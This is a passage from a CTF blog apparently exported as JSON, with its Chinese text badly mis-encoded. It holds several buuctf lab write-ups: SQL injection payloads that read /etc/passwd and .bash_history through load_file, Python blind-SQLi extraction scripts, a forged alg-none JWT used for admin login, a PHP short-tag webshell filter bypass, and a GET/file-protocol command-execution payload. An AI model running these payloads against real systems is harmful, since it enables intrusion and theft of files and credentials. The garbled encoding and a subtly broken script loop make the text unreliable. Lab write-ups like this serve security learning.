æ‰¾äº†å¥½ä¹…æ²¡å‘ç°æ˜¯ä»€ä¹ˆåŸå› \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457000040-68cd4018-9ec3-40a8-b762-b9cc760e35b5.png)\n\næ— æœåªèƒ½å†å»å¯»æ‰¾åˆ«çš„æ–¹æ³•\n\nç„¶åå‘ç°äº†å¦ä¸€ä¸ª æå–è¿œç¨‹ git æ³„éœ²æˆ–æœ¬åœ° git çš„å·¥å…·   git_extract  å¯ä»¥è¯´æ˜¯å¢å¼ºç‰ˆ \n\næºç åœ°å€ï¼šhttps://github.com/gakki429/Git_Extract\n\nè°ƒç”¨çš„æ—¶å€™ è¦ç”¨python2 å› ä¸ºè¿™æ˜¯python2çš„è„šæœ¬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457176398-212a1e06-efb1-4962-a7ca-4eeb2f93d696.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457212657-afd10c8f-9d96-48ce-8e53-9ce1e4516f90.png)\n\nå‘ç°äº†æ›´æ—©çš„æºç \n\n```plain\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\nåˆ†æï¼š\n\nå­˜åœ¨ä¸¤ä¸ªè¡¨ board å’Œ commet\n\nå¹¶ä¸”  `$sql = \"select category from board where id='$bo_id'\";`å½“æˆ‘ä»¬è¯„è®ºæ—¶å€™è¿˜ä¼šè°ƒç”¨boardè¡¨\n\nå†æ¥çœ‹\n\n```plain\n $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n```\n\n $category,$contentæ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚ä¸”æœ€åæ˜¾ç¤ºçš„æ˜¯contentï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é—­åˆcontent = '$content'\n\nä¸¾ä¾‹å½“æˆ‘ä»¬å»å‘å¸–è¯­å¥ä¸º\n\n category ä¸º`',content=user(),/*`å…¶å®ƒéšæ„ï¼Œç„¶åå»è¯¦æƒ…é‡Œé¢è¯„è®º`*/#` è¿™æ ·å°±ä¼šå›æ˜¾æˆ‘ä»¬å½“å‰ç”¨æˆ·ä¿¡æ¯ \n\n ç„¶åè¯­å¥ä¼šè¢«æ‹¼æ¥æˆä¸‹é¢è¿™æ ·\n\n```plain\ninsert into comment\n       set category = ' ',content=user()ï¼Œ/*',\n           content = '*/#',\n           bo_id = '$bo_id'\";\n```\n\nå³åŸæ¥çš„contentå†…å®¹è¢«æˆ‘ä»¬ç”¨æ³¨é‡Š`/**/`ç»™æ³¨é‡Šäº† æˆ‘ä»¬è‡ªå·±å¯ä»¥åˆ›å»ºä¸€ä¸ªcontentä»è€Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„è¯­å¥\n\næ„é€ payload:`',content=user(),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457876263-11247f01-8e8e-4d7d-bc18-9f12b9db735c.png)\n\nå‘ç°æ˜¯rootæƒé™ è¿™å¯å¤ªè¡Œäº†\n\nç›´æ¥ç”¨load_file()å‡½æ•°å»è¯»æ–‡ä»¶\n\næ„é€ payload:`123',content=((select(load_file(\"/etc/passwd\")))),/*`\n\n```\ncategory=123',content=((select(load_file(\"/etc/passwd\")))),/*` æ³¨æ„ä¸€ä¸‹è¿™é‡Œcategoryé‡Œé¢æœ€å¥½éšä¾¿æ”¾ç‚¹å†…å®¹ å¦‚æœç›´æ¥æ˜¯ç©ºçš„ æ¯”å¦‚æ„é€ æˆè¿™æ ·`',content=((select(load_file(\"/etc/passwd\")))),/*\n```\n\né—­åˆè¿›å»ä¹‹åå°±ä¼šå˜æˆ`category=''`ç›´æ¥ä¸ºç©ºå­—ç¬¦ å¯èƒ½ä¼šæ— å›æ˜¾\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681458181723-73e833f2-d821-432c-9068-e596e2fdc3f6.png)\n\nå‘ç°æˆåŠŸè¯»å–\n\nçœ‹åˆ°æœ€åä¸€è¡Œ å‘ç°å­˜åœ¨wwwç”¨æˆ· é‚£ä¹ˆè¿™æ˜¯ä»€ä¹ˆå‘¢ ä¸€èˆ¬æˆ‘ä»¬åœ¨linuxä¸‹å®‰è£…webå¼€è®¾é¶åœº ä¸€èˆ¬é»˜è®¤ç³»ç»Ÿwebç”¨æˆ·ä¼šä¸ºwww\n\nä¸€èˆ¬å¢åŠ çš„ç”¨æˆ·ä¿¡æ¯ä¼šåœ¨/homeè·¯å¾„ä¸‹ rootæœ¬èº«çš„ä¿¡æ¯ä¼šåœ¨æ ¹ç›®å½•/rootè·¯å¾„é‡Œ\n\næ¯”å¦‚æˆ‘æ›¾ç»åœ¨æˆ‘çš„centos7ä¸Šè£…è¿‡å°çš®é¢æ¿ å°±ä¼šæœ‰ä¸ªwwwç”¨æˆ·é»˜è®¤åœ¨æˆ‘çš„/homeè·¯å¾„ä¸‹ï¼ˆé‚£ä¸ªappleç”¨æˆ·æ˜¯æˆ‘å½“æ—¶åˆ›å»ºçš„ç”¨æˆ· ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681459107727-6f72a691-4d4d-4bfb-978b-ec74ff3871b8.png)\n\nå¹¶ä¸”èƒ½çœ‹åˆ°åœ°å€ç›®å½•ä¸ºï¼š/home/www\n\næ„é€ payload:`123',content=((select(load_file(\"/home/www/.bash_history\")))),/*`\n\nè¿™é‡Œ.bash_historyæ–‡ä»¶æ˜¯ä»€ä¹ˆå‘¢ ä¸€èˆ¬åœ¨linux ä»¥`.`å¼€å¤´çš„éƒ½æ˜¯éšè—æ–‡ä»¶\n\n**åœ¨ç»ˆç«¯æ•²è¿‡çš„å‘½ä»¤ï¼Œlinuxæ˜¯æœ‰è®°å½•çš„ï¼Œé»˜è®¤å¯ä»¥è®°å½•500æ¡å†å²å‘½ä»¤ã€‚è¿™äº›å‘½ä»¤ä¿å­˜åœ¨ç”¨æˆ·çš„å®¿ä¸»ç›®å½•ä¸­çš„.bash_historyæ–‡ä»¶ä¸­ã€‚**\n\næ‹¿æˆ‘æœ¬åœ°appleç”¨æˆ·æ¥è¯´ï¼Œå¦‚ä¸‹\n\næˆ‘æ›¾ç»ä¿®æ”¹è¿‡appleç”¨æˆ·çš„å¯†ç  æ‰€ä»¥æœ‰è®°å½•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475557865-59d282b4-768a-4e0d-b4d2-4723531214e1.png)\n\nå›åˆ°é¢˜ç›®å¾—åˆ°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475942695-14971e8c-c568-4952-af18-e563d06b2d01.png)\n\nçœ‹åˆ°è®°å½•æœ‰ä¾æ¬¡å¦‚ä¸‹æ“ä½œï¼š\n\n1. `cd /tmp`\n2. `unzip html.zip`\n3. `rm -f html.zip`\n4. `cp -r html /var/www/`\n5. `cd /var/www/html/`\n6. `rm -f .DS_Store`\n7. `service apache2`\n\nä»–åªåˆ é™¤äº†åœ¨/var/www/htmlä¸‹çš„ .DS_Storeæ–‡ä»¶ åŸæ¥è·¯å¾„ä¸‹çš„.DS_Storeæ–‡ä»¶è¿˜ä¿å­˜ç€ æˆ‘ä»¬å¯ä»¥è¯»å–ï¼Œå¹¶ä¸”é‡Œé¢å†…å®¹è¯»å‡ºæ¥å¤§å¤šæ•°æ˜¯ä¹±ç  æœ€å¥½ä»¥hex()å‡½æ•°ä¹Ÿå°±æ˜¯16è¿›åˆ¶è¯»å‡ºæ¥\n\n .DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚ç›¸å½“äº Windows ä¸‹çš„ desktop.iniã€‚  \n\næ„é€ payloadï¼š`test',content=((select(hex(load_file(\"/tmp/html/.DS_Store\"))))),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681476511756-e8b75674-d60e-4d5d-a7ce-31cf1e5ab0bf.png)\n\nå‘ç°äº†flagæ–‡ä»¶å  flag_8946e1ff1ee3e40f.php\n\nç„¶åå»è¯»å– æ„é€ payloadï¼š`test',content=((select(hex(load_file(\"/var/www/html/flag_8946e1ff1ee3e40f.php\"))))),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477444236-e9e3cfb8-9317-4232-8d52-18308f23d7fd.png)\n\nè½¬ç å¾—åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477495066-73d43d91-f33b-43a7-b0cf-182e906dd900.png)\n","tags":["sqlæ³¨å…¥","æºç æ³„éœ²"],"categories":["buuctf"]},{"title":"buuctf-86-[GYCTF2020]Ezsqli","url":"/post/d359692.html","content":"\n[GYCTF2020]Ezsqli\n\n<!--more-->\n\nä¸€çœ¼ä¸çœŸï¼Œé‰´å®šä¸ºsqlç›²æ³¨ã€‚\n\n## çˆ†åº“ï¼š\n\n```python\nimport requests #è°ƒrequestsæ¨¡å—\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \n#payload = {\"id\":\"0^(ascii(substr((select database()),1,1))>97)\"}\ndatabase = ''\nfor i in range (1,25):\n    for j in range(31,128):\n        payload = {\"id\":\"0^(ascii(substr((select database()),{},1))={})\".format(i,j)}\n        r = requests.post(url,data=payload)\n        time.sleep(0.005)\n        if 'Nu1L' in r.text:\n            database+=chr(j)\n            print(database)\n            continue\n        else:\n            pass\n# çˆ†åº“ give_grandpa_pa_pa_pa\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680942404461-ef13c20a-2bb9-45ae-8ff3-c0427fb9144b.png)\n\nåº“æ²¡ç”¨å…¶å®ï¼Œä¹‹åå¯ä»¥ç”¨database()ä»£æ›¿ è€Œä¸”andä¹Ÿæ˜¯è¢«æ²³èŸ¹äº† give_grandpa_pa_pa_pa  åº“åç”¨ä¸äº†çš„\n\n## çˆ†è¡¨ï¼š\n\nå› ä¸ºorè¢«æ²³èŸ¹\n\næ‰€ä»¥ä¸èƒ½ç”¨`information_schema`æ¥æŸ¥è¯¢ ç”¨`sys.x$schema_flattened_keys`æ¥ä»£æ›¿\n\nå‚è€ƒï¼šhttps://nosec.org/home/detail/3830.html\n\n```python\nimport requests #è°ƒrequestsæ¨¡å—\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \n#payload = {\"id\":\"0^ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))<103\"}\ntables = ''\nfor i in range (1,50):\n    for j in range(31,12):\n        payload = {\"id\":\"0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),{},1))={})\".format(i,j)}\n        r = requests.post(url,data=payload)\n        time.sleep(0.005)\n        if 'Nu1L' in r.text:\n            tables+=chr(j)\n            print(tables)\n            continue\n        else:\n            pass\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680945616193-69eecadc-cb2f-454e-b445-ddf0fae6ee7d.png)\n\nä½¿ç”¨äºŒåˆ†æ³•æ”¹è¿›åï¼š\n\n```python\nimport requests #è°ƒrequestsæ¨¡å—\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \ntables = \"\"\nfor i in range (1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        payload = {\"id\":\"0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),{},1))>{})\".format(i,mid)}\n        r = requests.post(url,data=payload)\n        if(\"Nu1L\" in r.text):\n            low=mid+1\n            mid = (low+high)//2\n        else:\n            high=mid-1\n            mid = (low+high)//2\n    tables+=chr(high+1)\n    print(tables)\n    time.sleep(0.3)\n```\n\n## çˆ†flag\n\nè¿™é‡Œç”¨åˆ°äº†åˆ—æ¯”è¾ƒå»è¯•flag\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682765495231-e76b1bfa-890e-434c-ac6e-8b375375bddf.png)\n\n`0^((1,'{0}')>(select * from f1ag_1s_h3r3_hhhhh))` è¿™é‡Œçš„ 1æ˜¯çŒœæµ‹ç¬¬ä¸€åˆ—ä¸€èˆ¬ä¸ºç´¢å¼•id 1ï¼Œå› æ­¤åœ¨è¿™é‡Œç”¨1ï¼Œä¹‹åå°±æ˜¯å»æ…¢æ…¢å†™è„šæœ¬å»è¯•å­—ç¬¦ï¼Œè¿™é‡Œå†™è„šæœ¬çš„æ—¶å€™è¦åŠ ä¸Šä¹‹å‰å·²ç»çˆ†å‡ºçš„å­—ç¬¦æ…¢æ…¢å»æ¯”è¾ƒã€‚\n\n\n\n```python\nimport requests #è°ƒrequestsæ¨¡å—\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \nflag = \"\"\nfor i in range (1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        flag_1 = flag + chr(mid)\n        payload = {\"id\":\"0^((1,'{0}')>(select * from f1ag_1s_h3r3_hhhhh))\".format(flag_1)}\n        r = requests.post(url,data=payload)\n        if(\"Nu1L\" in r.text):\n            high=mid-1\n            mid = (low+high)//2\n        else:\n            low=mid+1\n            mid = (low+high)//2\n    print(flag,chr(high))\n    flag+=chr(high)\n    time.sleep(2)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680960278657-402336f5-111f-495a-982c-872e948175e1.png)\n","tags":["sqlæ³¨å…¥","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-85-[HFCTF2020]EasyLogin","url":"/post/a8c0011c.html","content":"\n[HFCTF2020]EasyLogin\n\n<!--more-->\n\nä¸€é“å…³äºjwtè®¤è¯çš„é¢˜ç›® ä¹‹å‰æœ‰åšè¿‡ç›¸åŒçš„é¢˜ç›®\n\nç”³è¯·ä¸€ä¸ªè´¦å·ç™»å½•  ç„¶åå°±æ˜¯ä¸€ä¸ªè·å–flagçš„è¾“å…¥æ¡† ä½†æ˜¯æˆ‘ä»¬æ™®é€šèº«ä»½è‚¯å®šæ˜¯è·å–ä¸åˆ°çš„\n\nè¿™é‡Œæˆ‘è¯•äº†è¯•ç”³è¯·adminè´¦å·å‘ç°ä¸è¡Œ åšåˆ°è¿™é‡Œä¼°è®¡æ˜¯åé¢å¤§æ¦‚ç‡æ˜¯è¦ä¼ªé€ èº«ä»½ä¸ºadminç„¶ågetflag\n\næŸ¥çœ‹æºç å‘ç°æ˜¯ç”¨koaæ¡†æ¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961292803-2507d542-7b9c-4425-9228-4b0c8129a613.png)\n\nç„¶åçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpè¿™ä¸ªæ¡†æ¶æ˜¯ç”¨jwté‰´æƒçš„\n\nå…³äºé‰´æƒå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« https://juejin.cn/post/7003147063542153224\n\nç™»å½•æŠ“åŒ…\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961802245-b79f5a21-698c-4857-8b2c-d169a365a871.png)\n\nå°†å…¶æ”¾å…¥https://jwt.io/ è‡ªåŠ¨å¸®æˆ‘ä»¬ç”Ÿæˆç›¸å…³ä¿¡æ¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961865878-e174b300-c12c-44a4-bd80-b9f0908ae748.png)\n\nJWT(json web token)çš„ä¸‰ä¸ªéƒ¨åˆ†ä¾æ¬¡å¦‚ä¸‹ï¼šï¼ˆå‚è€ƒï¼šhttp://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.htmlï¼‰\n\n- Headerï¼ˆå¤´éƒ¨ï¼‰\n- Payloadï¼ˆè´Ÿè½½ï¼‰\n- Signatureï¼ˆç­¾åï¼‰\n\næ¯”å¦‚ï¼š`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY4MTk1OTg3N30.jJv8tD-ULxBStlglQIsVQgnR-nC7hbxsPJqOQiF_qJg`\n\nä¸‰éƒ¨åˆ†ä¹‹é—´ç”¨`.`é—´éš”\n\nè¿™é‡Œè¿™é‡Œç»•è¿‡éœ€è¦å°†algï¼ˆç®—æ³•ï¼‰æ”¹ä¸ºnone å°†secretidæ”¹ä¸º[]\n\nå› ä¸ºè¿™ä¸ªç½‘ç«™æ— æ³•æˆnoneåçš„jwtç¼–ç  æ‰€ä»¥åªèƒ½æ‰‹åŠ¨ç”Ÿæˆ ä¹Ÿå°±æ˜¯æ¯éƒ¨åˆ†base64ç¼–ç  ç„¶åå†ç”¨`.`è¿æ¥\n\nå› ä¸ºç®—æ³•å·²ç»æ˜¯noneäº†æ‰€ä»¥ä¸éœ€è¦ç¬¬ä¸‰æ®µç­¾åäº†\n\n```\n{\"alg\": \"none\",\"typ\": \"JWT\"}\neyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ==\n{\"secretid\": [],\"username\": \"admin\",\"password\": \"123\",\"iat\": 1681959877}\neyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9\n```\n\n`eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9.`æ³¨æ„è¿™é‡Œè™½ç„¶ç­¾åéƒ¨åˆ†è¢«çœç•¥äº† ä½†æ˜¯æœ€åä¸€ä¸ª`.`è¦åŠ ä¸Š å¹¶ä¸”ç­¾åä¸­base64ç¼–ç ä¸­ç”¨æ¥è¡¥ä½`==`è¦åˆ é™¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962341963-9db7cc75-363b-4962-a3e9-305804f318ad.png)\n\næˆåŠŸä»¥adminèº«ä»½ç™»å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962377789-ed8fda04-f829-4128-b346-0eaa7fd13958.png)\n\nè·å–flagå³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962413236-6f1c0fae-a99c-4e2c-bb3b-b1eddb193dfd.png)\n\nå…¶å®è¿™é“é¢˜è¿˜æ˜¯å‰æœŸä¿¡æ¯æ£€ç´¢å»æ˜ç™½ä»–æ¡†æ¶æ˜¯jwté‰´æƒ\n","tags":["jwt"],"categories":["buuctf"]},{"title":"buuctf-79-[çº¢æ˜è°·CTF 2021]write_shell","url":"/post/51b0b22f.html","content":"\n[çº¢æ˜è°·CTF 2021]write_shell\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nè¿™é“é¢˜ç›®è¿˜æ˜¯è›®ç®€å•çš„ï¼Œè€ƒäº†phpçŸ­æ ‡ç­¾å’Œç©ºæ ¼ç»•è¿‡ï¼Œè¿˜æœ‰ä¸€ä¸ªåŒé—®å·è¡¨è¾¾å¼\n\n## è§£é¢˜ï¼š\n\næ”¾å‡ºæºç \n\n```plain\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction check($input){\n    if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n        // if(preg_match(\"/'| |_|=|php/\",$input)){\n        die('hacker!!!');\n    }else{\n        return $input;\n    }\n}\n\nfunction waf($input){\n  if(is_array($input)){\n      foreach($input as $key=>$output){\n          $input[$key] = waf($output);\n      }\n  }else{\n      $input = check($input);\n  }\n}\n\n$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';\nif(!file_exists($dir)){\n    mkdir($dir);\n}\nswitch($_GET[\"action\"] ?? \"\") {\n    case 'pwd':\n        echo $dir;\n        break;\n    case 'upload':\n        $data = $_GET[\"data\"] ?? \"\";\n        waf($data);\n        file_put_contents(\"$dir\" . \"index.php\", $data);\n}\n?>\n```\n\né¦–å…ˆå°±æ˜¯é€šè¿‡ä½ çš„`sandbox+md5(ip)`åˆ›å»ºä¸€ä¸ªæ²™ç›’è·¯å¾„ è€å¥—è·¯äº†\n\nç„¶åè¿™é‡Œæœ‰ä¸¤ä¸ªé—®å·`??`å…ˆæ¥çœ‹çœ‹\n\nè¿™ç§æ˜¯æ¯”è¾ƒè¿ç®—ç¬¦ä¸­çš„NULL åˆå¹¶æ“ä½œç¬¦,ä»PHP7å¼€å§‹æä¾›,ä½œç”¨æ˜¯:ä»å·¦å¾€å³ç¬¬ä¸€ä¸ªå­˜åœ¨ä¸”ä¸ä¸º NULL çš„æ“ä½œæ•°ã€‚å¦‚æœéƒ½æ²¡æœ‰å®šä¹‰ä¸”ä¸ä¸º NULLï¼Œåˆ™è¿”å› NULL  \n\nå°±æ˜¯å¦‚æœc= a??b å¦‚æœaä¸º0 åˆ™c=b å¦‚æœaä¸ä¸º0 åˆ™c=a\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661478990-0980b9d2-889c-49ef-a790-becc223c2860.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661494898-f5c96b64-3163-4984-9ebb-6d5cfd802007.png)\n\nç„¶åå°±æ˜¯æœ‰ä¸¤ä¸ªæ¨¡å¼ ä¸€ä¸ªpwdå°±æ˜¯è¿”å›è·¯å¾„çš„ uploadæ¨¡å¼è®©æˆ‘æäº¤shellçš„ä½†æ˜¯æäº¤å‰ä¼šé€šè¿‡ä¸€ä¸ªç­›é€‰\n\nè¿‡æ»¤äº†`\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\"` `php eval {} ` ç©ºæ ¼éƒ½è¢«ç¦äº†\n\nå¦‚æœç›´æ¥æ„é€ `?data=ls%09/`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661798378-610250da-1970-4ea0-92aa-8712ea9df795.png)\n\nåˆ™åªä¼šæ˜¾ç¤º ä¸ä¼šæ‰§è¡Œ é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ„é€ phpä»£ç å»æ‰§è¡Œæˆ‘ä»¬çš„linuxå‘½ä»¤ è¿™ä¹Ÿå°è¯äº†å‰é¢ä¸ºä»€ä¹ˆè¦ç¦phpå­—æ ·äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661956409-64ad7724-461e-4519-adb7-e66b1a2ea3e7.png)\n\nä½†æ˜¯phpå­—æ ·è¢«ç¦ æ‰€ä»¥è¦ç”¨çŸ­æ ‡ç­¾äº† ä¸‹é¢äºŒé€‰ä¸€\n\n```\n<?echo%09`ls%09/`?>\n<?=`ls%09/`?>\n```\n\nè¿™é‡Œç»•è¿‡ç©ºæ ¼ ä¸èƒ½ç”¨`$IFS$9` ä¼°è®¡æ˜¯å› ä¸ºphpä¼šæŠŠè¿™ä¸ª`$`å½“ä½œå˜é‡æ¥è§£æå§ ç”¨%09ç»•è¿‡å°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679662047463-b38f3a26-75d5-4987-b03b-70f5bd8d9244.png)\n\nç„¶åcatè¯»å‡ºæ¥å°±è¡Œäº†\n","tags":["bypass","phpçŸ­æ ‡ç­¾"],"categories":["buuctf"]},{"title":"buuctf-82-[HITCON 2017]SSRFme","url":"/post/8253ed9f.html","content":"\n[HITCON 2017]SSRFme\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nè¿™æ˜¯ä¸€é“ssrf ä¹Ÿå°±æ˜¯æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ çš„é¢˜ç›® å‘ç°è¿™æ ·çš„é¢˜ç›®å¸¸å¸¸ä¼šæœ‰ $_SERVERæ•°ç»„çš„åº”ç”¨ï¼Œè¿˜æ˜¯è›®ä¸é”™çš„qwq\n\n## è§£é¢˜ï¼š\n\nè¿›å…¥é¢˜ç›®ç»™å‡ºæºç ï¼š\n\n```plain\n10.244.80.206 <?php\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];\n    }\n\n    echo $_SERVER[\"REMOTE_ADDR\"];\n\n    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n\n    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\n    $info = pathinfo($_GET[\"filename\"]);\n    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\n    @mkdir($dir);\n    @chdir($dir);\n    @file_put_contents(basename($info[\"basename\"]), $data);\n    highlight_file(__FILE__);\n```\n\né¦–å…ˆç¬¬ä¸€éƒ¨åˆ†ifä½œç”¨å°±æ˜¯è·å–æˆ‘ä»¬çš„ip\n\nç„¶åç¬¬äºŒéƒ¨åˆ† æ ¹æ®æˆ‘ä»¬çš„ipåˆ›å»ºä¸€ä¸ªç”±md5åŠ å¯†çš„æ²™ç›’ ç„¶åé€‰æ‹©å®ƒ\n\nç¬¬ä¸‰éƒ¨åˆ† `shell_exec` æ‰§è¡Œæˆ‘ä»¬çš„ getåˆ°çš„ `GET+url`çš„å‘½ä»¤\n\nè¿™é‡Œç”¨åˆ°äº†linuxä¸­ GETå‘½ä»¤ \n\n GET è¿™ä¸ªå‘½ä»¤çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¸»è¦æ˜¯ perl çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œåœ¨ open å¯ä»¥æ‰§è¡Œå‘½ä»¤å¹¶ä¸”è¿˜æ”¯æŒfileåè®®ã€‚  \n\n**æ³¨æ„ï¼šfile åè®®åˆ©ç”¨ open å‘½ä»¤æ‰§è¡Œ,è¦æ‰§è¡Œçš„å‘½ä»¤å…ˆå‰å¿…é¡»è¦æœ‰ä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å­˜åœ¨**\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655020115-9c486f4f-405b-44fe-93c6-564e21e45ae2.png)\n\nè¿™é‡Œä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å¿…é¡»åŠ ä¸Šç®¡é“ç¬¦`|` å¦åˆ™ä¸è¡Œ,ä¸å¤ªæ˜ç™½è¿™é‡Œä¸ºä»€ä¹ˆä¸åŠ å°±ä¸è¡Œ\n\npathinfo â€” è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679654422668-fd2e7ba0-b67a-4c25-801b-efb66dd197e1.png)\n\nä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬ä¼ å…¥filenameçš„æ–‡ä»¶ ç„¶åé€‰æ‹©å®ƒ\n\nfile_put_contents â€” å°†æ•°æ®å†™å…¥æ–‡ä»¶ \n\nè¿™é‡Œä¹Ÿå°±æ˜¯æŠŠ$dataçš„å†…å®¹å†™å…¥ æˆ‘ä»¬çš„filenameçš„æ–‡ä»¶ä¸­\n\næ„é€ payloadï¼š`?url=file:ls /|&filename=ls /|`  è¿™é‡Œè¦æ‰§è¡Œä¸¤æ¬¡æ‰èƒ½æˆåŠŸ ä¹Ÿå°±æ˜¯æäº¤ä¸¤æ¬¡  